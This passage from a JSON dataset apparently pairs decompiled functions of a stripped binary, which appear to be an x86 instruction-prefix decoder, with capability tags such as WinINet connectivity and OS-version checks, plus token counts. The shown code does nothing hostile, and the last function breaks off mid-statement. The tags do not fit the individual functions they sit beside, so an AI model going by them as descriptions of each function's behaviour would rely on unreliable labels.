        "decompiled_code": "\nuint64_t fcn.0004f30c(code **arg1)\n\n{\n    uint8_t uVar1;\n    uint64_t in_RAX;\n    uint64_t uVar2;\n    \n    uVar2 = in_RAX & 0xffffffffffffff00;\n    if (*(arg1 + 1) == *(arg1 + 9)) {\n        if (*(arg1 + 6) == '\\0') {\n            uVar2 = (**arg1)();\n            if (uVar2 != -1) {\n                *(arg1 + 9) = *(arg1 + 9) + '\\x01';\n                *(arg1 + 1) = *(arg1 + 9);\n                *(*(arg1 + 9) + 0x13a + arg1) = uVar2;\n                goto code_r0x0004f34e;\n            }\n        }\n        *(arg1 + 0x25) = 1;\n        *(arg1 + 6) = 1;\n        uVar2 = uVar2 & 0xffffffffffffff00;\n    }\n    else {\n        uVar1 = *(arg1 + 1) + 1;\n        *(arg1 + 1) = uVar1;\n        uVar2 = *(uVar1 + 0x13a + arg1);\ncode_r0x0004f34e:\n        *(*(arg1 + 3) + 0x23a + arg1) = uVar2;\n        *(arg1 + 3) = *(arg1 + 3) + '\\x01';\n    }\n    return uVar2;\n}\n",
        "token_count": 345
    },
    "0004f634": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0004f634(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    piVar1 = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x66690;\n    *(arg1 + 0xb8) = piVar1;\n    if (*(*(arg1 + 8) + 0x13a + arg1) == -0x70) {\n        if ((*(arg1 + 0xac) == '@') && ((*(arg1 + 0x129) & 1) != 0)) {\n            return;\n        }\n        if (*(arg1 + 0x12e) != '\\0') {\n            *(arg1 + 0x12e) = 0;\n            *(arg1 + 0xb8) = 0x77e30;\n            return;\n        }\n        uVar3 = 0x77e10;\n    }\n    else {\n        if ((*(arg1 + 0xac) != '@') || (*piVar1 != 0xf)) {\n            if (*piVar1 == 0x216) {\n                uVar2 = fcn.0004f374(arg1);\n                iVar4 = (uVar2 >> 3 & 7) * 0x20 + *(*(*(arg1 + 0xb8) + 0x1c) * 0x20 + 0x730f0);\n            }\n            else {\n                if (*piVar1 != 0x21f) {\n                    return;\n                }\n                uVar2 = fcn.0004f374(arg1);\n                if (0xbf < uVar2) {\n                    uVar2 = fcn.0004f374(arg1);\n                    *(arg1 + 0xb8) = (uVar2 - 0xc0) * 0x20 + *(*(*(arg1 + 8) + 0x13a + arg1) * 8 + 0x776f0);\n                    fcn.0004f30c(arg1);\n                    return;\n                }\n                uVar2 = fcn.0004f374(arg1);\n                iVar4 = (uVar2 >> 3 & 7) * 0x20 + *(*(*(arg1 + 8) + 0x13a + arg1) * 8 + 0x776b0);\n            }\n            *(arg1 + 0xb8) = iVar4;\n            return;\n        }\n        uVar3 = 0x77e50;\n    }\n    *(arg1 + 0xb8) = uVar3;\n    return;\n}\n",
        "token_count": 596
    },
    "0004f794": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0004f794(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint8_t uVar7;\n    \n    fcn.0004f30c(arg1);\n    cVar2 = *(arg1 + 0x131);\n    if (cVar2 == 'f') {\n        piVar1 = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x6c690;\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 299) = 0;\n        }\n    }\n    else if (cVar2 == -0xe) {\n        piVar1 = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x6e690;\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 0x130) = 0;\n        }\n    }\n    else if (cVar2 == -0xd) {\n        piVar1 = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x6a690;\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 0x12e) = 0;\n        }\n    }\n    if ((*(arg1 + 0xb8) == NULL) || (**(arg1 + 0xb8) == 0x244)) {\n        *(arg1 + 0xb8) = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x68690;\n    }\n    if (**(arg1 + 0xb8) == 0x220) {\n        *(arg1 + 0xb8) = 0x77df0;\n    }\n    if (**(arg1 + 0xb8) != 0x216) {\n        return;\n    }\n    uVar6 = (*(arg1 + 0xb8))[7];\n    if ((cVar2 == 'f') && (*(uVar6 * 0x20 + 0x730f8) != 0)) {\n        uVar3 = fcn.0004f374(arg1);\n        piVar1 = (uVar3 >> 3 & 7) * 0x20 + *(uVar6 * 0x20 + 0x730f8);\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 299) = 0;\n            return;\n        }\n    }\n    else if ((cVar2 == -0xe) && (*(uVar6 * 0x20 + 0x73100) != 0)) {\n        uVar3 = fcn.0004f374(arg1);\n        piVar1 = (uVar3 >> 3 & 7) * 0x20 + *(uVar6 * 0x20 + 0x73100);\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 0x130) = 0;\n            return;\n        }\n    }\n    else if ((cVar2 == -0xd) && (*(uVar6 * 0x20 + 0x73108) != 0)) {\n        uVar3 = fcn.0004f374(arg1);\n        piVar1 = (uVar3 >> 3 & 7) * 0x20 + *(uVar6 * 0x20 + 0x73108);\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 0x12e) = 0;\n            return;\n        }\n    }\n    if ((*(arg1 + 0x131) == '\\0') || (**(arg1 + 0xb8) == 0x216)) {\n        uVar3 = fcn.0004f374(arg1);\n        *(arg1 + 0xb8) = (uVar3 >> 3 & 7) * 0x20 + *(uVar6 * 0x20 + 0x730f0);\n    }\n    cVar2 = *(*(arg1 + 8) + 0x13a + arg1);\n    if (cVar2 != '\\x01') {\n        if (cVar2 != -0x52) {\n            return;\n        }\n        uVar3 = fcn.0004f374(arg1);\n        uVar7 = uVar3 >> 3 & 7;\n        uVar3 = fcn.0004f374(arg1);\n        uVar3 = uVar3 >> 6;\n        if (uVar7 == 5) {\n            if (uVar3 == 3) {\n                iVar5 = 0x72e90;\n                goto code_r0x0004fae7;\n            }\n        }\n        else if (uVar7 == 6) {\n            if (uVar3 == 3) {\n                iVar5 = 0x72eb0;\n                goto code_r0x0004fae7;\n            }\n        }\n        else if ((uVar7 == 7) && (uVar3 == 3)) {\n            iVar5 = 0x72ed0;\n            goto code_r0x0004fae7;\n        }\n        iVar5 = 0x72a90;\n        goto code_r0x0004faff;\n    }\n    uVar3 = fcn.0004f374(arg1);\n    uVar7 = uVar3 >> 3 & 7;\n    uVar3 = fcn.0004f374(arg1);\n    uVar4 = fcn.0004f374(arg1);\n    if (uVar7 == 3) {\n        if (uVar3 >> 6 != 3) {\ncode_r0x0004fa84:\n            iVar5 = 0x71690;\ncode_r0x0004faff:\n            *(arg1 + 0xb8) = uVar7 * 0x20 + iVar5;\n            return;\n        }\n        iVar5 = 0x71890;\n    }\n    else {\n        if ((uVar7 != 7) || (uVar3 >> 6 != 3)) goto code_r0x0004fa84;\n        iVar5 = 0x71790;\n    }\n    iVar5 = (uVar4 & 7) * 0x20 + iVar5;\ncode_r0x0004fae7:\n    *(arg1 + 0xb8) = iVar5;\n    fcn.0004f30c(arg1);\n    return;\n}\n",
        "token_count": 1625
    },
    "000500b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000500b4(int64_t arg1, ulong noname_1, uint *arg3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uchar uVar4;\n    uint16_t uVar5;\n    ushort uVar6;\n    uint uVar7;\n    int64_t iVar8;\n    int32_t iVar9;\n    uint64_t uVar10;\n    uint *arg2;\n    uint64_t arg2_00;\n    int64_t arg3_00;\n    uint64_t arg3_01;\n    \n    iVar8 = *(arg1 + 0xb8);\n    uVar1 = *(iVar8 + 4);\n    uVar2 = *(iVar8 + 0xc);\n    iVar9 = *(iVar8 + 0x14);\n    arg3_01 = *(iVar8 + 8);\n    arg2_00 = *(iVar8 + 0x10);\n    uVar10 = *(iVar8 + 0x18);\n    arg2 = arg1 + 200;\n    iVar8 = arg1;\n    if (0x44 < uVar1) {\n        if (uVar1 < 0x4d) {\n            if (uVar1 == 0x4c) {\n                if (uVar2 != 0x4b) {\n                    if (uVar2 == 0x4a) {\ncode_r0x00050257:\n                        arg2 = arg1 + 0xe8;\n                        arg3_01 = arg2_00;\n                        goto code_r0x00050808;\n                    }\n                    if (uVar2 != 2) {\n                        return;\n                    }\n                }\ncode_r0x00050718:\n                fcn.0004fbc8(arg1, arg1 + 0xe8, arg2_00);\n                if (iVar9 != 5) {\n                    return;\n                }\ncode_r0x0005073b:\n                arg3_00 = arg1 + 0x108;\n                goto code_r0x0005037a;\n            }\n            if (uVar1 != 0x45) {\n                if (uVar1 == 0x46) {\n                    fcn.00050048(arg1, arg3_01, arg2);\n                    *(arg1 + 0xe8) = 0x8c;\n                    uVar4 = fcn.0004f0e8(arg1, arg3_01);\n                    *(arg1 + 0xec) = uVar4;\n                    if (uVar2 == 6) {\n                        *(arg1 + 0xf8) = 1;\n                        return;\n                    }\n                    if (uVar2 == 0x2e) goto code_r0x000501ca;\n                    uVar10 = 0x1e;\n                    if (uVar2 != 0x1e) {\n                        return;\n                    }\n                    goto code_r0x000506d5;\n                }\n                if (uVar1 == 0x48) {\n                    *arg2 = 0x91;\n                    *(arg1 + 0xd0) = 3;\n                    return;\n                }\n                if (uVar1 != 0x49) {\n                    if ((uVar1 != 0x4a) && (uVar1 != 0x4b)) goto code_r0x00050764;\n                    goto code_r0x00050808;\n                }\n                if (uVar2 == 0x4a) {\n                    uVar3 = fcn.0004f374(arg1);\n                    if ((uVar3 & 0xc0) == 0xc0) {\n                        if (*(arg1 + 0xc0) == 0x124) {\n                            *(arg1 + 0xc0) = 0x11f;\n                        }\n                        else if (*(arg1 + 0xc0) == 0x121) {\n                            *(arg1 + 0xc0) = 0x122;\n                        }\n                    }\n                    goto code_r0x00050718;\n                }\n                if (uVar2 == 0x4b) goto code_r0x00050257;\n                if (uVar2 == 3) {\n                    uVar3 = fcn.0004f374(arg1);\n                    if ((uVar3 & 0xc0) == 0xc0) {\n                        *(arg1 + 0x128) = 1;\n                    }\n                }\n                else if (uVar2 != 2) {\n                    return;\n                }\n            }\n        }\n        else {\n            if (uVar1 == 0x4d) {\n                if ((uVar2 != 0x4e) && (uVar2 != 0x4f)) {\n                    return;\n                }\n                goto code_r0x00050808;\n            }\n            if ((uVar1 != 0x4e) && (uVar1 != 0x4f)) {\n                if (uVar1 == 0x50) {\n                    uVar3 = fcn.0004f374(arg1);\n                    if ((uVar3 & 0xc0) != 0xc0) {\n                        *(arg1 + 0x128) = 1;\n                    }\n                }\n                else {\n                    if (uVar1 != 0x51) goto code_r0x00050764;\n                    uVar3 = fcn.0004f374(arg1);\n                    if ((uVar3 & 0xc0) != 0xc0) {\n                        *(arg1 + 0x128) = 1;\n                    }\n                }\n                fcn.0004fbc8(arg1, arg2, arg3_01);\n                goto code_r0x00050368;\n            }\n        }\ncode_r0x00050201:\n        arg2 = arg1 + 0xe8;\n        arg3_01 = arg2_00;\ncode_r0x00050808:\n        fcn.0004fbc8(arg1, arg2, arg3_01);\n        return;\n    }\n    if (uVar1 == 0x44) {\n        fcn.0004fb64(arg1, arg3_01, arg2);\n        *arg2 = 0x90;\n        return;\n    }\n    if (uVar1 < 0x16) {\n        if (0xd < uVar1) {\n            iVar9 = (uVar1 - 0xd) + (*(arg1 + 0x129) & 1) * 8;\n            if ((4 < iVar9) && (*(arg1 + 0x129) != 0)) {\n                iVar9 = iVar9 + 4;\n            }\n            *arg2 = 0x8c;\n            *(arg1 + 0xd8) = iVar9;\n            goto code_r0x00050368;\n        }\n        if (uVar1 == 1) {\n            *arg2 = 0x8e;\n            if (*(arg1 + 0x133) == '\\x10') {\n                *(arg1 + 0xcc) = 0x20;\n                uVar5 = fcn.0004f39c(arg1);\n                *(arg1 + 0xd4) = uVar5;\n            }\n            else {\n                *(arg1 + 0xcc) = 0x30;\n                uVar7 = fcn.0004f3c8(arg1);\n                *(arg1 + 0xd4) = uVar7;\n            }\n            uVar6 = fcn.0004f39c(arg1);\n            *(arg1 + 0xd0) = uVar6;\n            return;\n        }\n        if (uVar1 == 2) {\ncode_r0x0005028d:\n            if (uVar2 == 4) {\n                fcn.0004fbc8(arg1, arg2, arg3_01);\n                if (iVar9 != 5) {\n                    if (iVar9 != 7) {\n                        return;\n                    }\n                    *(arg1 + 0x108) = 0x8c;\n                    *(arg1 + 0x118) = 2;\n                    *(arg1 + 0x10c) = 8;\n                    return;\n                }\n                goto code_r0x0005073b;\n            }\n            if (((uVar2 == 0x4c) || (uVar2 == 0x49)) || (uVar2 == 0x45)) goto code_r0x00050808;\n            fcn.0004fbc8(arg1, arg2, arg3_01);\n            if (uVar2 == 7) {\n                *(arg1 + 0xf8) = 2;\ncode_r0x000504af:\n                *(arg1 + 0xe8) = 0x8c;\n                *(arg1 + 0xec) = 8;\n                return;\n            }\n            if (uVar2 == 0x47) {\n                *(arg1 + 0xe8) = 0x91;\n                *(arg1 + 0xf0) = 1;\n                return;\n            }\n            goto code_r0x00050368;\n        }\n        if (uVar1 == 3) {\n            uVar3 = fcn.0004f374(arg1);\n            if ((uVar3 & 0xc0) == 0xc0) {\n                *(arg1 + 0x128) = 1;\n            }\n            goto code_r0x0005028d;\n        }\n        if (uVar1 == 4) {\n            if (uVar2 != 3) {\n                if ((uVar2 != 2) && (uVar2 != 0x51)) {\n                    if (uVar2 == 0x50) {\n                        uVar3 = fcn.0004f374(arg1);\n                        if ((uVar3 & 0xc0) != 0xc0) {\n                            *(arg1 + 0x128) = 1;\n                        }\n                    }\n                    else if (uVar2 != 0x4a) {\n                        return;\n                    }\n                    goto code_r0x00050257;\n                }\n                goto code_r0x00050718;\n            }\n            uVar3 = fcn.0004f374(arg1);\n            if ((uVar3 & 0xc0) == 0xc0) {\n                *(arg1 + 0x128) = 1;\n            }\n            goto code_r0x00050201;\n        }\n        if (uVar1 == 5) {\n            fcn.0004fb64(arg1, arg3_01, arg2);\n            if (uVar2 != 5) {\n                if (uVar2 == 6) {\ncode_r0x0005016b:\n                    *(arg1 + 0xe8) = 0x8c;\n                    *(arg1 + 0xf8) = 0x17;\n                    *(arg1 + 0xec) = 0x10;\n                    return;\n                }\n                if (uVar2 != 0x2e) {\n                    return;\n                }\n                goto code_r0x000501c3;\n            }\n        }\n        else {\n            if ((uVar1 < 6) || (0xd < uVar1)) goto code_r0x00050764;\n            *arg2 = 0x8c;\n            *(arg1 + 0xd8) = uVar1 - 5;\n            *(arg1 + 0xcc) = 8;\n            if (uVar2 != 5) {\n                if (uVar2 != 0x18) {\n                    if (uVar2 != 0x46) {\n                        return;\n                    }\n                    fcn.00050048(arg1, arg2_00, arg1 + 0xe8);\n                    return;\n                }\n                goto code_r0x0005016b;\n            }\n        }\n    }\n    else {\n        if (0x35 < uVar1) {\n            if (0x35 < uVar1) {\n                if (uVar1 < 0x3c) {\n                    if (((*(arg1 + 0xac) == '@') && (uVar1 != 0x3a)) && (uVar1 != 0x3b)) {\n                        *(arg1 + 0x128) = 1;\n                    }\n                    *(arg1 + 0xd8) = uVar1 + 0xf;\n                    goto code_r0x00050559;\n                }\n                if (uVar1 < 0x44) {\n                    *arg2 = 0x8c;\n                    *(arg1 + 0xd8) = uVar1 + 0x37;\n                    *(arg1 + 0xcc) = 0;\n                    if (7 < uVar2 - 0x3c) {\n                        return;\n                    }\n                    *(arg1 + 0xe8) = 0x8c;\n                    *(arg1 + 0xec) = 0;\n                    *(arg1 + 0xf8) = uVar2 + 0x37;\n                    return;\n                }\n            }\ncode_r0x00050764:\n            *(arg1 + 0x108) = 0;\n            *(arg1 + 0xe8) = 0;\n            *arg2 = 0;\n            return;\n        }\n        if (uVar1 < 0x2e) {\n            if (uVar1 == 0x16) {\n                *(arg1 + 0xd8) = 0x15;\ncode_r0x00050559:\n                *arg2 = 0x8c;\n                *(arg1 + 0xcc) = 0x10;\n                return;\n            }\n            if (uVar1 == 0x18) {\n                *arg2 = 0x8c;\n                *(arg1 + 0xd8) = 0x17;\n                *(arg1 + 0xcc) = 0x10;\n                if (uVar2 != 0x2e) {\n                    if (uVar2 != 6) {\n                        return;\n                    }\n                    *(arg1 + 0xf8) = 1;\n                    goto code_r0x000504af;\n                }\ncode_r0x000501c3:\n                *(arg1 + 0xe8) = 0x8c;\ncode_r0x000501ca:\n                uVar7 = 0x25;\n                if (*(arg1 + 0x133) == '\\x10') {\n                    uVar7 = 0x15;\n                }\n                goto code_r0x000501da;\n            }\n            if ((uVar1 < 0x1e) || (0x2d < uVar1)) goto code_r0x00050764;\n            *arg2 = 0x8c;\n            uVar7 = fcn.0004f1dc(arg1, uVar1, arg3);\n            *(arg1 + 0xd8) = uVar7;\n            if (uVar2 == 5) {\n                arg3_00 = arg1 + 0xe8;\n                arg1 = iVar8;\n                uVar10 = arg2_00;\n                goto code_r0x0005037a;\n            }\n            if (7 < uVar2 - 0x1e) {\n                if (uVar2 != 0x46) {\n                    return;\n                }\n                fcn.00050048(iVar8, arg2_00, arg1 + 0xe8);\n                uVar4 = fcn.0004f0e8(arg1, arg2_00);\n                *(arg1 + 0xcc) = uVar4;\n                return;\n            }\n            *(arg1 + 0xe8) = 0x8c;\n            uVar10 = uVar2;\n            arg2 = arg3;\ncode_r0x000506d5:\n            uVar7 = fcn.0004f1dc(iVar8, uVar10, arg2);\ncode_r0x000501da:\n            *(arg1 + 0xf8) = uVar7;\n            return;\n        }\n        *arg2 = 0x8c;\n        if (*(arg1 + 0x133) == '\\x10') {\n            iVar9 = uVar1 - 0x19;\n        }\n        else {\n            iVar9 = uVar1 - 9;\n        }\n        *(arg1 + 0xd8) = iVar9;\n        if (uVar2 == 0x18) goto code_r0x0005016b;\ncode_r0x00050368:\n        if (uVar2 != 5) {\n            return;\n        }\n    }\n    arg3_00 = arg1 + 0xe8;\n    uVar10 = arg2_00;\ncode_r0x0005037a:\n    fcn.0004fb64(arg1, uVar10, arg3_00);\n    return;\n}\n",
        "token_count": 3691
    },
    "00050824": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00050824(uint64_t arg1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    ulong in_RDX;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint uVar9;\n    uchar *puVar10;\n    ulong in_R8;\n    uint32_t uVar11;\n    \n    uVar7 = 0;\n    *(arg1 + 0x18) = 0;\n    fcn.0004f238(arg1);\n    fcn.0004f30c(arg1);\n    uVar11 = 0;\n    bVar3 = false;\n    uVar9 = 0x36;\n    do {\n        uVar1 = *(*(arg1 + 8) + 0x13a + arg1);\n        if ((uVar1 & 0xf0) == 0x40) {\n            if (*(arg1 + 0xac) == '@') {\n                *(arg1 + 0x129) = uVar1;\n                goto code_r0x0005093b;\n            }\ncode_r0x00050873:\n            bVar3 = true;\n        }\n        else {\n            if (uVar1 < 0x66) {\n                if (uVar1 == 0x65) {\n                    *(arg1 + 0x12a) = 0x4a;\n                }\n                else if (uVar1 == 0x26) {\n                    *(arg1 + 0x12a) = 0x45;\n                }\n                else if (uVar1 == 0x2e) {\n                    *(arg1 + 0x12a) = 0x46;\n                }\n                else if (uVar1 == 0x36) {\n                    *(arg1 + 0x12a) = 0x47;\n                }\n                else if (uVar1 == 0x3e) {\n                    *(arg1 + 0x12a) = 0x48;\n                }\n                else {\n                    if (uVar1 != 100) goto code_r0x00050873;\n                    *(arg1 + 0x12a) = 0x49;\n                }\n            }\n            else if (uVar1 == 0x66) {\n                *(arg1 + 299) = 0x66;\n                *(arg1 + 0x131) = 0x66;\n            }\n            else if (uVar1 == 0x67) {\n                *(arg1 + 300) = 0x67;\n            }\n            else if (uVar1 == 0xf0) {\n                *(arg1 + 0x12d) = 0xf0;\n            }\n            else if (uVar1 == 0xf2) {\n                *(arg1 + 0x130) = 0xf2;\n                *(arg1 + 0x131) = 0xf2;\n            }\n            else {\n                if (uVar1 != 0xf3) goto code_r0x00050873;\n                *(arg1 + 0x12e) = 0xf3;\n                *(arg1 + 0x131) = 0xf3;\n            }\ncode_r0x0005093b:\n            fcn.0004f30c(arg1);\n        }\n        if (0xe < uVar11) {\n            *(arg1 + 0x128) = 1;\n            break;\n        }\n        uVar11 = uVar11 + 1;\n    } while (!bVar3);\n    if (*(arg1 + 0x18) != '\\0') {\n        *(arg1 + 8) = *(arg1 + 8) + -1;\n        *(arg1 + 0x18) = *(arg1 + 0x18) + -1;\n    }\n    fcn.0004fb20(arg1);\n    cVar4 = *(arg1 + 0xac);\n    if (cVar4 == '@') {\n        iVar8 = *(arg1 + 0xb8);\n        *(arg1 + 0x129) = *(arg1 + 0x129) & (*(iVar8 + 0x1e) & 0xf | 0x40);\n        *(arg1 + 0x132) = *(iVar8 + 0x1c) & 8;\n        *(arg1 + 0x128) = *(iVar8 + 0x1c) & 0x10;\n        if (((*(iVar8 + 0x1c) & 0xff0000) == 0) || ((*(arg1 + 0x129) & 8) == 0)) {\n            if (*(arg1 + 299) == '\\0') {\n                *(arg1 + 0x133) = (-(*(arg1 + 0x132) != '\\0') & 0x20U) + 0x20;\n            }\n            else {\n                *(arg1 + 0x133) = 0x10;\n            }\n        }\n        else {\n            *(arg1 + 0x133) = 0x40;\n        }\n        cVar4 = (-(*(arg1 + 300) != '\\0') & 0xe0U) + 0x40;\ncode_r0x00050a65:\n        *(arg1 + 0x134) = cVar4;\n    }\n    else {\n        if (cVar4 == ' ') {\n            *(arg1 + 0x133) = (-(*(arg1 + 299) != '\\0') & 0xf0U) + 0x20;\n            cVar4 = (-(*(arg1 + 300) != '\\0') & 0xf0U) + 0x20;\n            goto code_r0x00050a65;\n        }\n        if (cVar4 == '\\x10') {\n            *(arg1 + 0x133) = (-(*(arg1 + 299) != '\\0') & 0x10U) + 0x10;\n            cVar4 = (-(*(arg1 + 300) != '\\0') & 0x10U) + 0x10;\n            goto code_r0x00050a65;\n        }\n    }\n    iVar8 = *(arg1 + 0xb8);\n    if (((*(iVar8 + 0x1c) & 4) == 0) && (*(arg1 + 299) != '\\0')) {\n        *(arg1 + 0x128) = 1;\n    }\n    if (((*(iVar8 + 0x1c) & 1) == 0) && (*(arg1 + 300) != '\\0')) {\n        *(arg1 + 0x128) = 1;\n    }\n    *(arg1 + 0x137) = *(iVar8 + 0x1c) >> 5 & 1;\n    *(arg1 + 0x138) = *(iVar8 + 0x1c) >> 6 & 1;\n    *(arg1 + 0x139) = *(iVar8 + 0x1c) >> 7 & 1;\n    uVar6 = arg1;\n    fcn.000500b4(arg1, in_RDX, in_R8);\n    if ((*(*(arg1 + 0xb8) + 0x1c) >> 8 & 1) != 0) {\n        if (*(arg1 + 0x133) == ' ') {\n            uVar11 = *(arg1 + 0xc0);\n            if (uVar11 < 0x14b) {\n                if (uVar11 == 0x14a) {\ncode_r0x00050b68:\n                    uVar6 = uVar11;\n                    uVar9 = 0x149;\n                }\n                else {\n                    uVar6 = uVar11 - 0x19;\n                    if (uVar11 - 0x19 == 0) {\n                        uVar9 = 0x5a;\n                    }\n                    else {\n                        uVar6 = uVar11 - 0x39;\n                        if (uVar11 - 0x39 != 0) {\n                            uVar6 = uVar11 - 0x59;\n                            if (uVar11 - 0x59 == 0) {\n                                uVar9 = 0x5b;\n                            }\n                            else {\n                                uVar6 = uVar11 - 0xd4;\n                                if (uVar11 - 0xd4 == 0) {\ncode_r0x00050b4a:\n                                    uVar9 = 0xd3;\n                                }\n                                else {\n                                    uVar6 = uVar11 - 0xd9;\n                                    if (uVar11 - 0xd9 == 0) {\n                                        uVar9 = 0xda;\n                                    }\n                                    else {\n                                        uVar11 = uVar11 - 0x103;\n                                        uVar6 = uVar11;\n                                        if (uVar11 == 0) {\n                                            uVar9 = 0x101;\n                                        }\n                                        else {\n                                            if (uVar11 != 0x32) goto code_r0x00050bcf;\n                                            uVar9 = 0x132;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                uVar6 = uVar11 - 0x185;\n                if (uVar11 - 0x185 == 0) {\n                    uVar9 = 0x186;\n                }\n                else {\n                    uVar6 = uVar11 - 0x187;\n                    if (uVar11 - 0x187 == 0) {\n                        uVar9 = 0x188;\n                    }\n                    else {\n                        uVar6 = uVar11 - 0x1ae;\n                        if (uVar11 - 0x1ae == 0) {\n                            uVar9 = 0x1af;\n                        }\n                        else {\n                            uVar6 = uVar11 - 0x1b0;\n                            if (uVar11 - 0x1b0 == 0) {\n                                uVar9 = 0x1b1;\n                            }\n                            else {\n                                uVar11 = uVar11 - 0x1ce;\n                                uVar6 = uVar11;\n                                if (uVar11 == 0) {\n                                    uVar9 = 0x1cc;\n                                }\n                                else {\n                                    if (uVar11 != 0x26) goto code_r0x00050bcf;\n                                    uVar9 = 0x1f5;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        else {\ncode_r0x00050bcf:\n            if (*(arg1 + 0x133) == '@') {\n                uVar5 = *(arg1 + 0xc0);\n                uVar6 = uVar5;\n                if (uVar5 < 0x104) {\n                    if (uVar5 == 0x103) {\n                        uVar9 = 0x102;\n                    }\n                    else {\n                        uVar6 = uVar5 - 0x19;\n                        if (uVar5 - 0x19 == 0) {\n                            uVar9 = 0x1a;\n                        }\n                        else {\n                            uVar6 = uVar5 - 0x39;\n                            if (uVar5 - 0x39 == 0) {\n                                uVar9 = 0x37;\n                            }\n                            else {\n                                uVar6 = uVar5 - 0x3b;\n                                if (uVar5 - 0x3b == 0) {\n                                    uVar9 = 0x222;\n                                }\n                                else {\n                                    uVar6 = uVar5 - 0x59;\n                                    if (uVar5 - 0x59 == 0) {\n                                        uVar9 = 0x40;\n                                    }\n                                    else {\n                                        uVar5 = uVar5 - 0xd4;\n                                        uVar6 = uVar5;\n                                        if (uVar5 == 0) goto code_r0x00050b4a;\n                                        if (uVar5 != 5) goto code_r0x00050c8a;\n                                        uVar9 = 0xdb;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    uVar6 = uVar5 - 0x135;\n                    if (uVar5 - 0x135 == 0) {\n                        uVar9 = 0x133;\n                    }\n                    else {\n                        uVar11 = uVar5 - 0x14a;\n                        if (uVar11 == 0) goto code_r0x00050b68;\n                        uVar6 = uVar5 - 0x187;\n                        if (uVar5 - 0x187 == 0) {\n                            uVar9 = 0x189;\n                        }\n                        else {\n                            uVar6 = uVar5 - 0x1b0;\n                            if (uVar5 - 0x1b0 == 0) {\n                                uVar9 = 0x1b2;\n                            }\n                            else {\n                                uVar5 = uVar5 - 0x1ce;\n                                uVar6 = uVar5;\n                                if (uVar5 == 0) {\n                                    uVar9 = 0x1cd;\n                                }\n                                else {\n                                    if (uVar5 != 0x26) goto code_r0x00050c8a;\n                                    uVar9 = 0x223;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else {\ncode_r0x00050c8a:\n                uVar6 = 0;\n                if ((*(arg1 + 0x134) == ' ') && (*(arg1 + 0xc0) == 0xdc)) {\n                    uVar9 = 0xdd;\n                }\n                else if ((*(arg1 + 0x134) != '@') || (uVar9 = 0xdf,  *(arg1 + 0xc0) != 0xdc)) {\n                    uVar9 = *(arg1 + 0xc0);\n                }\n            }\n        }\n        *(arg1 + 0xc0) = uVar9;\n    }\n    iVar2 = *(arg1 + 0xc0);\n    *(arg1 + 0x135) = 0;\n    *(arg1 + 0x136) = 0;\n    if ((iVar2 == 0x18) || (iVar2 == 0xde)) {\n        if (*(arg1 + 0xcc) == '\\x04') {\n            *(arg1 + 0xcc) = 0x10;\n        }\n        else {\n            if (*(arg1 + 0xcc) != '\\x05') {\n                *(arg1 + 0x135) = 0;\n                *(arg1 + 0x136) = 1;\n                goto code_r0x00050d3e;\n            }\n            *(arg1 + 0xcc) = 0x20;\n        }\n        *(arg1 + 0x135) = 1;\n        *(arg1 + 0x136) = 0;\n    }\n    else if (iVar2 == 0x220) {\n        uVar9 = fcn.0004f4f8(uVar6 & 0xffffffffffffff00 | *(*(arg1 + 8) + 0x13a + arg1));\n        *(arg1 + 0xc0) = uVar9;\n    }\ncode_r0x00050d3e:\n    if (*(arg1 + 0x128) != '\\0') {\n        fcn.0004f238(arg1);\n        *(arg1 + 8) = *(arg1 + 8) - *(arg1 + 0x18);\n        *(arg1 + 0x18) = 0;\n        cVar4 = fcn.0004f30c(arg1);\n        *(arg1 + 0xd0) = 